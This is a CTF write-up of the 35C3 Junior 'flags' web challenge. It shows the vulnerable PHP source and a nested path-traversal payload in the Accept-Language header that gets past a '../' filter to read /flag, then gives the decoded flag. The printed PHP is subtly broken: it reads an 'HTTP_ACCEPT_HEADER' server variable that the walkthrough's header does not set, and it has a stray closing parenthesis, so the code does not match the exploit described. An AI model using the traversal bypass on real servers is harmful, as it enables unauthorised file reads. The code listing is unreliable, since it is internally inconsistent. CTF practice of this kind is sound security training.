---
layout: post
title: "Solution to 35C3 Junior CTF challenge flags"
author: capitol
category: ctf
---

![flags](/images/multiple-flags.jpg)

##### Name:
flags

##### Category:
web

##### Points:
500 (variable)

#### Writeup

This was the challenge we got:

> Fun with flags: http://35.207.169.47
>
> Flag is at /flag
>
> Difficulty estimate: Easy

# Walkthrough

We got the server side code, which looks like this:

```php
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_HEADER'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">');
```

The objective was to read the file at `/flag` on the file system. When loading the
web page, one is most likely to get a warning from PHP hinting that there is no file
at the `flags/$lang` path from PHP, where $lang is the user's language.

The embedded PHP suggests that whatever is at that file path is Base64 encoded and
pushed directly into the image part of the page response.

By manipulating the `Accept-Language` request header, one can alter what file is
requested. But, all input values are sanitised by replacing `"../"` in the input
string with `""`.

By changing the request header to

```
Accept-Language: ....//....//....//....//flag
```

the image header turns into

```
<img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
```

which, when decoded, yields the flag `35c3\_this\_flag\_is\_the\_be5t\_fl4g`.
